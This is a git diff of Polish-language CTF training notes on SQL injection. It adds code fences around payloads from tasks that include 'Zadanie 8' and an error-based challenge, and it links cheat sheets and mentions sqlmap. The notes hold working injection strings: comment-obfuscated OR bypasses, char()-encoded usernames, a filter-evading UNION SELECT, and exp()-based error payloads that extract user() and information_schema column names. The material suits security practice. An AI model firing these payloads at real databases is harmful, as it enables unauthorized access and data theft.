@@ -90,6 +90,7 @@ https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
 
 1 or username = 'admin' #
 
+```
 //test
 100/*a*/or/*a*/username=char(116,101,115,116)
 //nobody
@@ -97,8 +98,11 @@ https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
 //admin
 100/*a*/or/*a*/username=char(97, 100, 109, 105, 110)/*a*/limit/*a*/1
 // But user 'admin' doesn't exist...
+```
 
+```
 1/*a*/union/*a*/sel''ect/*a*/0,1,2,3,4,5,6,7,char(97, 100, 109, 105, 110),9,10,11,12,13,14/*a*/limit/*a*/1,1
+```
 
 # Zadanie 8
 Error based SQL injection
@@ -107,10 +111,13 @@ https://uw2017.p4.team/error-sqli
 
 https://osandamalith.com/2015/07/15/error-based-sql-injection-using-exp/
 
+```
 a' union select exp(~(select*from(select user())x)),1,2,3#
 a' union select exp(~(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x)),1,2,3#
+```
 // 4 columns in table user
 
 
 # Narzędzia (raczej do pentestów)
-sqlmap
+
+`sqlmap`
